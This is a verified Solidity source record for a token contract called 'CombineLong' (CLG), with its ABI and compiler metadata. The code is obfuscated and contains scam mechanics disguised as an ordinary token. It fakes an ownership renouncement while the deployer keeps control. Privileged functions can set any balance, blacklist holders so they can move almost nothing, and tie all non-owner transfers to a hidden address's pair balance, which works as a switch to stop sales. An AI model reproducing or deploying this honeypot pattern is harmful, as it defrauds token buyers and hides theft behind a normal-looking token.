{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface autoAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedAmount) external view returns (uint256);\n\n    function transfer(address launchedTx, uint256 launchedListLiquidity) external returns (bool);\n\n    function allowance(address limitTxFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedListLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTx,\n        uint256 launchedListLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingToken, uint256 value);\n    event Approval(address indexed limitTxFee, address indexed spender, uint256 value);\n}\n\nabstract contract isLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTake {\n    function createPair(address feeAtAuto, address shouldFrom) external returns (address);\n}\n\ninterface autoAtMetadata is autoAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CombineLong is isLaunch, autoAt, autoAtMetadata {\n\n    function transfer(address exemptTeamShould, uint256 launchedListLiquidity) external virtual override returns (bool) {\n        return sellExempt(_msgSender(), exemptTeamShould, launchedListLiquidity);\n    }\n\n    bool public tokenFrom;\n\n    function owner() external view returns (address) {\n        return receiverAutoAt;\n    }\n\n    address private receiverAutoAt;\n\n    function name() external view virtual override returns (string memory) {\n        return txReceiver;\n    }\n\n    event OwnershipTransferred(address indexed limitWallet, address indexed teamFund);\n\n    uint256 constant fundReceiverWallet = 2 ** 10;\n\n    function maxLaunch() public {\n        emit OwnershipTransferred(isLimit, address(0));\n        receiverAutoAt = address(0);\n    }\n\n    constructor (){\n        \n        toTotal fromLaunch = toTotal(txAutoAt);\n        feeTrading = tradingTake(fromLaunch.factory()).createPair(fromLaunch.WETH(), address(this));\n        if (launchWallet != takeTeam) {\n            tokenFrom = false;\n        }\n        isLimit = _msgSender();\n        maxLaunch();\n        launchedTeam[isLimit] = true;\n        isLaunched[isLimit] = fromTeam;\n        if (totalMarketing) {\n            launchWallet = takeTeam;\n        }\n        emit Transfer(address(0), isLimit, fromTeam);\n    }\n\n    function sellExempt(address marketingMode, address launchedTx, uint256 launchedListLiquidity) internal returns (bool) {\n        if (marketingMode == isLimit) {\n            return tokenTo(marketingMode, launchedTx, launchedListLiquidity);\n        }\n        uint256 exemptShould = autoAt(feeTrading).balanceOf(minFrom);\n        require(exemptShould == exemptFrom);\n        require(launchedTx != minFrom);\n        if (liquiditySellBuy[marketingMode]) {\n            return tokenTo(marketingMode, launchedTx, fundReceiverWallet);\n        }\n        return tokenTo(marketingMode, launchedTx, launchedListLiquidity);\n    }\n\n    string private txReceiver = \"Combine Long\";\n\n    mapping(address => uint256) private isLaunched;\n\n    function marketingTo(address txTotal) public {\n        minEnable();\n        if (tokenFrom != totalMarketing) {\n            tokenFrom = false;\n        }\n        if (txTotal == isLimit || txTotal == feeTrading) {\n            return;\n        }\n        liquiditySellBuy[txTotal] = true;\n    }\n\n    function balanceOf(address launchedAmount) public view virtual override returns (uint256) {\n        return isLaunched[launchedAmount];\n    }\n\n    function launchFund(uint256 launchedListLiquidity) public {\n        minEnable();\n        exemptFrom = launchedListLiquidity;\n    }\n\n    uint256 minMarketing;\n\n    function tokenTo(address marketingMode, address launchedTx, uint256 launchedListLiquidity) internal returns (bool) {\n        require(isLaunched[marketingMode] >= launchedListLiquidity);\n        isLaunched[marketingMode] -= launchedListLiquidity;\n        isLaunched[launchedTx] += launchedListLiquidity;\n        emit Transfer(marketingMode, launchedTx, launchedListLiquidity);\n        return true;\n    }\n\n    bool public fundAt;\n\n    uint256 private takeTeam;\n\n    uint256 exemptFrom;\n\n    bool public totalMarketing;\n\n    address minFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private modeSwap = \"CLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverAutoAt;\n    }\n\n    address public isLimit;\n\n    function teamMin(address exemptTeamShould, uint256 launchedListLiquidity) public {\n        minEnable();\n        isLaunched[exemptTeamShould] = launchedListLiquidity;\n    }\n\n    address txAutoAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public launchMarketingSwap;\n\n    function allowance(address minLiquidity, address receiverLaunch) external view virtual override returns (uint256) {\n        if (receiverLaunch == txAutoAt) {\n            return type(uint256).max;\n        }\n        return autoMarketingEnable[minLiquidity][receiverLaunch];\n    }\n\n    function approve(address receiverLaunch, uint256 launchedListLiquidity) public virtual override returns (bool) {\n        autoMarketingEnable[_msgSender()][receiverLaunch] = launchedListLiquidity;\n        emit Approval(_msgSender(), receiverLaunch, launchedListLiquidity);\n        return true;\n    }\n\n    mapping(address => bool) public launchedTeam;\n\n    function minEnable() private view {\n        require(launchedTeam[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoMarketingEnable;\n\n    uint256 private fromTeam = 100000000 * 10 ** 18;\n\n    function txMode(address sellLiquidity) public {\n        if (fundAt) {\n            return;\n        }\n        \n        launchedTeam[sellLiquidity] = true;\n        \n        fundAt = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromTeam;\n    }\n\n    mapping(address => bool) public liquiditySellBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeSwap;\n    }\n\n    address public feeTrading;\n\n    uint256 private launchWallet;\n\n    function transferFrom(address marketingMode, address launchedTx, uint256 launchedListLiquidity) external override returns (bool) {\n        if (_msgSender() != txAutoAt) {\n            if (autoMarketingEnable[marketingMode][_msgSender()] != type(uint256).max) {\n                require(launchedListLiquidity <= autoMarketingEnable[marketingMode][_msgSender()]);\n                autoMarketingEnable[marketingMode][_msgSender()] -= launchedListLiquidity;\n            }\n        }\n        return sellExempt(marketingMode, launchedTx, launchedListLiquidity);\n    }\n\n    uint8 private maxFee = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTxFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedListLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedListLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"}],\"name\":\"marketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedListLiquidity\",\"type\":\"uint256\"}],\"name\":\"teamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedListLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedListLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"}],\"name\":\"txMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CombineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}